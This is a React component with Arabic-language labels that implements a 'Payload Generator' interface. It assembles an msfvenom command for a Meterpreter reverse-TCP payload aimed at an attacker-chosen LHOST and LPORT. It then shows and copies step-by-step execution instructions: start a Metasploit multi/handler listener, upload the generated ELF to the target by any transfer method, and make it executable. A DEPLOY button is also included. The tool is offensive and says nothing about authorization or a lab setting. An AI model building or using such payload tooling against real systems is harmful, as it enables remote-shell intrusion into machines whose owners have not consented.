import React, { useState } from 'react';
import { motion } from 'motion/react';
import { Zap, Terminal, Shield, Download, Cpu, Code, Globe, Server, Copy, Check } from 'lucide-react';

interface PayloadGeneratorProps {
  onAction?: (action: string) => void;
}

export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) => {
  const [os, setOs] = useState('linux');
  const [arch, setArch] = useState('x64');
  const [payloadType, setPayloadType] = useState('reverse_tcp');
  const [lhost, setLhost] = useState('192.168.1.10');
  const [lport, setLport] = useState('4444');
  const [isGenerating, setIsGenerating] = useState(false);
  const [generatedPayload, setGeneratedPayload] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  const handleGenerate = () => {
    setIsGenerating(true);
    setGeneratedPayload(null);
    
    setTimeout(() => {
      const payload = `msfvenom -p ${os}/${arch}/meterpreter/${payloadType} LHOST=${lhost} LPORT=${lport} -f elf > payload.elf`;
      setGeneratedPayload(payload);
      setIsGenerating(false);
    }, 2000);
  };

  const handleCopy = () => {
    if (!generatedPayload) return;
    
    const instructions = [
      "1. قم بتشغيل مستمع (Listener) على جهازك باستخدام Metasploit: use exploit/multi/handler",
      "2. ارفع الملف المولد إلى الهدف باستخدام أي وسيلة انتقال (FTP, HTTP, etc.)",
      "3. امنح صلاحيات التنفيذ للملف: chmod +x payload.elf"
    ].join('\n');
    
    const textToCopy = `Payload:\n${generatedPayload}\n\nInstructions:\n${instructions}`;
    
    navigator.clipboard.writeText(textToCopy).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  return (
    <div className="flex-1 flex flex-col overflow-hidden bg-[var(--bg-secondary)] p-4 md:p-6">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="text-lg font-black uppercase tracking-[3px] text-[var(--text-primary)] flex items-center gap-3">
            <Zap className="text-[var(--accent-orange)]" size={20} />
            مولد الحمولات البرمجية (Payload Generator)
          </h2>
          <p className="text-[10px] text-[var(--text-muted)] font-mono mt-1 uppercase tracking-widest">ADVANCED_EXPLOIT_PAYLOAD_CONSTRUCTION_KIT</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1 overflow-hidden">
        {/* Configuration Panel */}
        <div className="lg:col-span-1 space-y-6 overflow-y-auto custom-scrollbar pr-2">
          <div className="space-y-4">
            <div className="flex items-center gap-2 text-[var(--accent-orange)]">
              <Cpu size={16} />
              <h3 className="text-xs font-black uppercase tracking-widest">إعدادات الهدف</h3>
            </div>
            
            <div className="space-y-3">
              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">نظام التشغيل (OS)</label>
                <select 
                  value={os}
                  onChange={(e) => setOs(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] outline-none focus:border-[var(--accent-orange)] transition-colors"
                >
                  <option value="linux">Linux</option>
                  <option value="windows">Windows</option>
                  <option value="android">Android</option>
                  <option value="osx">OSX</option>
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">المعمارية (Architecture)</label>
                <select 
                  value={arch}
                  onChange={(e) => setArch(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] outline-none focus:border-[var(--accent-orange)] transition-colors"
                >
                  <option value="x64">x64</option>
                  <option value="x86">x86</option>
                  <option value="armle">ARM</option>
                  <option value="mipsle">MIPS</option>
                </select>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <div className="flex items-center gap-2 text-[var(--accent-cyan)]">
              <Globe size={16} />
              <h3 className="text-xs font-black uppercase tracking-widest">إعدادات الاتصال</h3>
            </div>
            
            <div className="space-y-3">
              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">LHOST (Local IP)</label>
                <input 
                  type="text"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-colors"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">LPORT (Local Port)</label>
                <input 
                  type="text"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-colors"
                />
              </div>
            </div>
          </div>

          <button 
            onClick={handleGenerate}
            disabled={isGenerating}
            className="w-full py-3 bg-[rgba(255,136,0,0.1)] border border-[rgba(255,136,0,0.2)] text-[var(--accent-orange)] rounded-md text-[11px] font-black uppercase tracking-[2px] hover:bg-[var(--accent-orange)] hover:text-[var(--bg-primary)] transition-all active:scale-95 disabled:opacity-50"
          >
            {isGenerating ? 'جاري التوليد...' : 'توليد الحمولة (GENERATE)'}
          </button>
        </div>

        {/* Output Panel */}
        <div className="lg:col-span-2 flex flex-col overflow-hidden bg-[rgba(10,14,23,0.4)] border border-[var(--border-color)] rounded-[var(--radius-lg)]">
          <div className="px-4 py-3 border-b border-[var(--border-color)] bg-[rgba(255,255,255,0.02)] flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Code size={14} className="text-[var(--text-secondary)]" />
              <span className="text-xs font-black uppercase tracking-wider">كود الحمولة المولد (Generated Output)</span>
            </div>
            {generatedPayload && (
              <button 
                onClick={handleCopy}
                className="flex items-center gap-2 px-3 py-1 bg-[var(--bg-tertiary)] border border-[var(--border-color)] rounded text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)] hover:text-[var(--accent-cyan)] hover:border-[var(--accent-cyan)] transition-all"
              >
                {copied ? <Check size={12} className="text-[var(--accent-green)]" /> : <Copy size={12} />}
                {copied ? 'تم النسخ' : 'نسخ الكل'}
              </button>
            )}
          </div>
          
          <div className="flex-1 p-6 font-mono text-sm overflow-y-auto custom-scrollbar relative">
            {isGenerating ? (
              <div className="absolute inset-0 flex flex-col items-center justify-center space-y-4 bg-[rgba(10,14,23,0.8)] backdrop-blur-sm z-10">
                <div className="w-12 h-12 border-4 border-[var(--accent-orange)] border-t-transparent rounded-full animate-spin" />
                <p className="text-xs font-black uppercase tracking-widest text-[var(--accent-orange)]">Compiling Payload...</p>
              </div>
            ) : null}

            {generatedPayload ? (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="space-y-6"
              >
                <div className="p-4 rounded bg-[var(--bg-tertiary)] border border-[var(--border-color)] text-[var(--accent-green)] break-all">
                  {generatedPayload}
                </div>
                
                <div className="space-y-4">
                  <div className="text-[10px] font-black uppercase tracking-widest text-[var(--text-muted)]">تعليمات التنفيذ (Execution Instructions)</div>
                  <div className="space-y-2">
                    <div className="flex items-start gap-3 p-3 rounded bg-[rgba(255,255,255,0.02)] border border-[var(--border-color)]">
                      <div className="w-5 h-5 rounded-full bg-[rgba(0,240,255,0.1)] text-[var(--accent-cyan)] flex items-center justify-center text-[10px] font-bold shrink-0">1</div>
                      <p className="text-[11px] text-[var(--text-secondary)]">قم بتشغيل مستمع (Listener) على جهازك باستخدام Metasploit: <code className="text-[var(--accent-cyan)]">use exploit/multi/handler</code></p>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded bg-[rgba(255,255,255,0.02)] border border-[var(--border-color)]">
                      <div className="w-5 h-5 rounded-full bg-[rgba(0,240,255,0.1)] text-[var(--accent-cyan)] flex items-center justify-center text-[10px] font-bold shrink-0">2</div>
                      <p className="text-[11px] text-[var(--text-secondary)]">ارفع الملف المولد إلى الهدف باستخدام أي وسيلة انتقال (FTP, HTTP, etc.)</p>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded bg-[rgba(255,255,255,0.02)] border border-[var(--border-color)]">
                      <div className="w-5 h-5 rounded-full bg-[rgba(0,240,255,0.1)] text-[var(--accent-cyan)] flex items-center justify-center text-[10px] font-bold shrink-0">3</div>
                      <p className="text-[11px] text-[var(--text-secondary)]">امنح صلاحيات التنفيذ للملف: <code className="text-[var(--accent-cyan)]">chmod +x payload.elf</code></p>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3">
                  <button 
                    onClick={() => {
                      if (generatedPayload) {
                        onAction?.(`deploy ${payloadType}`);
                      }
                    }}
                    className="flex-1 flex items-center justify-center gap-2 px-6 py-2.5 bg-[var(--accent-orange)] text-[var(--bg-primary)] rounded-md font-black text-[10px] uppercase tracking-[2px] hover:shadow-[0_0_15px_rgba(255,136,0,0.4)] transition-all active:scale-95"
                  >
                    <Zap size={14} />
                    نشر الحمولة (DEPLOY)
                  </button>
                  <button className="flex items-center gap-2 px-6 py-2.5 bg-[var(--accent-cyan)] text-[var(--bg-primary)] rounded-md font-black text-[10px] uppercase tracking-[2px] hover:shadow-[0_0_15px_rgba(0,240,255,0.4)] transition-all active:scale-95">
                    <Download size={14} />
                    تحميل (DL)
                  </button>
                </div>
              </motion.div>
            ) : (
              <div className="h-full flex flex-col items-center justify-center text-[var(--text-muted)] opacity-30 space-y-4">
                <Terminal size={48} strokeWidth={1} />
                <p className="text-xs uppercase tracking-widest">Configure parameters and click generate</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
